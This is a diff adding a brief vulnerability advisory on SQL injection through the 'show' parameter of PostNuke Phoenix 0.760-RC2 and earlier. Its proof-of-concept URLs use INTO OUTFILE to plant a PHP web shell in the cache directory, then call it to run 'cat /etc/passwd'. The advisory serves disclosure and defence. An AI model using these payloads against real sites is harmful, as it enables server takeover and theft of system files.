@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/12684/info
+
+PostNuke Phoenix is reported prone to an SQL injection vulnerability. This issue arises due to insufficient sanitization of user-supplied input.
+
+It is reported that issue presents itself when malicious SQL syntax is issued to the application through the 'show' variable.
+
+PostNuke 0.760-RC2 and prior versions are reported vulnerable. 
+
+http://www.example.com/index.php?name=Downloads&req=search&query=&show=cXIb8O3
+
+http://www.example.com/index.php?name=Downloads&req=search&query=[Program name]&show=10%20INTO%20OUTFILE%20'/[PATH]/pnTemp/Xanthia_cache/cXIb8O3.php'/*
+
+http://www.example.com/pnTemp/Xanthia_cache/cXIb8O3.php?cx=cat /etc/passwd 
